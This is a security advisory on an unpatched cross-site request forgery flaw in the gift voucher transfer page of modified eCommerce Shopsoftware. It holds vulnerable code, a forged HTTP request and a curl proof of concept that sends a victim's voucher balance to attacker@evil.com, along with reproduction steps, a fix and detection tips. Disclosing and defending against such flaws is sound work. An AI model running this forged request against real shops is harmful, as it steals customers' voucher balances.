# CSRF in modified eCommerce Shopsoftware `gv_send.php` — Gift Voucher Hijack

> **Identifier:** CVE pending
> **Affected:** modified eCommerce Shopsoftware ≤ 3.3.0 (rev 16825) — including current `main` as of 2026-11-18
> **Severity:** Medium · **CVSS 3.1:** 4.3 — `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N`
> **CWE:** CWE-352 (Cross-Site Request Forgery) · **CAPEC-62**
> **Status:** Unpatched

---

## 1. Executive Summary

modified eCommerce Shopsoftware v3.3.0 is vulnerable to Cross-Site Request Forgery in `gv_send.php`. The gift voucher transfer endpoint processes state-changing actions without validating a CSRF token. An attacker who tricks an authenticated customer with a gift voucher balance into visiting a malicious page can silently transfer that balance to an attacker-controlled email address.

Other sensitive endpoints in the same application (`account_edit.php`, `account_password.php`) correctly implement CSRF protection via `check_secure_form()`; `gv_send.php` does not — in v3.3.0 **and still in the current `main` branch** (verified 2026-11-18, after the vendor's 2026-11-12 security update, which did not address this endpoint).

## 2. Affected Products

| Product / Component | Affected Versions | Fixed Version | Status |
|---|---|---|---|
| modified eCommerce Shopsoftware | ≤ 3.3.0 (rev 16825) | None | Affected |
| Component: `gv_send.php` | rev 16825 → current `main` | None | Affected |

- **Repository:** https://github.com/modified-shop/modified-shop
- **Evaluated stack:** PHP 8.1.34, Apache 2.4, MariaDB 10.6, Debian Linux (Docker)

Unaffected: `account_edit.php`, `account_password.php`, `account_delete.php` — CSRF protected via `check_secure_form()`.

## 3. Vulnerability Description

`gv_send.php` handles gift voucher transfers when `GET action=process` is set. It reads `$_POST['to_email']`, `$_POST['amount']`, and other fields to debit the authenticated user's gift voucher balance and send a voucher to the specified email. The endpoint never calls `check_secure_form()` or any equivalent token validation before processing the transfer.

```php
// gv_send.php:88 (simplified)
if (isset($_GET['action']) && $_GET['action'] == 'process') {
    // ← NO check_secure_form() call here
    // account_edit.php:143, by contrast, begins the equivalent branch with:
    //   if (check_secure_form($_POST) === false) { ... }

    $to_email = $_POST['to_email'];
    $amount   = $_POST['amount'];

    // Debit victim's balance
    xtc_db_query("UPDATE ".TABLE_COUPON_GV_CUSTOMER."
                     SET amount = '".xtc_db_input($new_amount)."'
                   WHERE customer_id = '".(int)$_SESSION['customer_id']."'");

    // Create voucher for attacker's email + email the voucher code
    xtc_db_query("INSERT INTO ".TABLE_COUPONS." ...");
    xtc_php_mail(..., $to_email, ...);
}
```

**Conditions:** authenticated customer with gift voucher balance > 0; victim visits attacker-controlled page (UI:R); network vector.

## 4. Impact

- **Confidentiality:** None · **Integrity:** Low (voucher balance transferred to attacker) · **Availability:** None
- Practical financial impact scales with the victim's voucher balance.

## 5. Exploitation Scenario

1. Attacker crafts a malicious HTML page with an auto-submitting form targeting `gv_send.php?action=process`.
2. Page distributed via phishing email, forum post, or malicious ad.
3. A logged-in customer with a voucher balance visits the page; the browser auto-submits the form with the victim's cookies.
4. The shop debits the victim's balance and emails a voucher code to `attacker@evil.com`.
5. Attacker redeems the voucher at checkout.

## 6. Technical Evidence

```http
POST /gv_send.php?action=process HTTP/1.1
Host: TARGET
Cookie: MODsid=<CUSTOMER_SESSION_ID>
Content-Type: application/x-www-form-urlencoded
Referer: http://evil.com/

to_email=attacker%40evil.com&to_name=Attacker&send_name=Friend&amount=10&message=Gift
```

*(No CSRF token required — request accepted and processed)*

**Lab result (authorized Docker instance):** Customer ID=1, balance 100.00 EUR. After the forged request: balance 90.00 EUR; voucher `964c2df707` created in `coupon_send` with `to_customer_email=attacker@evil.com`; voucher code emailed to the attacker address.

```text
coupon_gv_customer.amount: 100.00 → 90.00
coupon_send: new record, to_customer_email = attacker@evil.com
```

## 7. Proof of Concept

See [`poc.html`](poc.html) — auto-submitting form. Manual equivalent:

```bash
# Requires a valid customer session with GV balance
curl -s -b "MODsid=<CUSTOMER_SESSION_ID>" \
  -X POST "http://TARGET/gv_send.php?action=process" \
  -d "to_email=attacker@evil.com&to_name=Attacker&send_name=Friend&amount=10&message=Gift"
```

### Reproduction Steps

1. Deploy an authorized instance. Create a customer account with gift voucher balance (e.g., 100.00).
2. Log in as that customer; keep the session active.
3. Serve `poc.html` (replace `TARGET`) from another origin.
4. Open the PoC page while the customer session is active.
5. Confirm the balance decreased and a voucher record exists for the attacker email.

**PoC limitations:** no service disruption, no persistence/backdoors, no real credentials, no mass exploitation automation.

## 8. Mitigation / Fix

```php
// gv_send.php — add at the start of the process block:
if (isset($_GET['action']) && $_GET['action'] == 'process') {
    check_secure_form();  // already present in account_edit.php:143
```

Secondary controls: `SameSite=Strict` for the session cookie; `Referer`/`Origin` validation.

## 9. Detection

- POST requests to `gv_send.php?action=process` with off-site `Referer`.
- Voucher balance decreases not initiated by the customer; bursts of voucher creations.

```text
grep "gv_send.php.*process" access.log | grep "POST"   # inspect Referer values
```

## 10. Disclosure Timeline

| Date | Event |
|---|---|
| 2026-11-16 | Identified via code review |
| 2026-11-16 | Confirmed in authorized lab |
| 2026-11-18 | Verified still unpatched in `main` (post 2026-11-12 vendor security update) |
| 2026-11-18 | Advisory + PoC published (this repository) |
| pending | Vendor notified / CVE requested |

## 11. Credits

- **Researchers:** Fernando Viana & Marcus Chaves
- **Contact:** nanduviana@gmail.com

## 12. References

- CWE-352: https://cwe.mitre.org/data/definitions/352.html
- CAPEC-62: https://capec.mitre.org/data/definitions/62.html
- CVSS calculator: https://www.first.org/cvss/calculator/3.1
- OWASP CSRF: https://owasp.org/www-community/attacks/csrf
- Vendor repository: https://github.com/modified-shop/modified-shop

---

*This advisory is published for educational, defensive, and security improvement purposes.*
